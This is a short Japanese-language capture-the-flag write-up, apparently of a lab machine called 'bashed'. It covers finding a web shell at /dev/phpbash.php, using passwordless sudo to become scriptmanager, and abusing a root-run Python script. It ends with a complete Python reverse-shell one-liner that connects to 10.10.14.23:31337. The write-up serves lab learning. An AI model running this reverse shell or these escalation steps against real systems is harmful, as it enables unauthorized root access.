# Recon
- 80 番ポートのみ空いている
- とりあえずディレクトリ探索
  - `/dev` が見かけないフォルダ
- `/dev` にアクセスすると `phpbash.php` があり、開くと `phpbash.php` が実行される
  - `www-data` として任意のコードが実行可能
  - `cat /home/arrexel/user.txt`

# Exploit
- privesc したいので `sudo -l` して使えそうなユーザがいないか見る
  - `www-data` は `scriptmanager` として任意のコードをパスワードなしで実行できる
  ```www-data@bashed
  :/var/www/html/dev# sudo -l

  Matching Defaults entries for www-data on bashed:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User www-data may run the following commands on bashed:
  (scriptmanager : scriptmanager) NOPASSWD: ALL
  ```
  - `sudo -u scriptmanager bash -i`
- (エスパー？) `/scripts` に入れるようになる
- (エスパー？) `test.txt` は毎分更新されており、 `test.py` が `root` により自動実行されている疑いがある
  - `/root/root.txt` を読み出すpythonコードを書けば root がそれを実行し root.txt が取れる
  - リバースシェルを張るコードをおいておけば root がpythonスクリプトを実行でき root が取れる
    - `echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py`

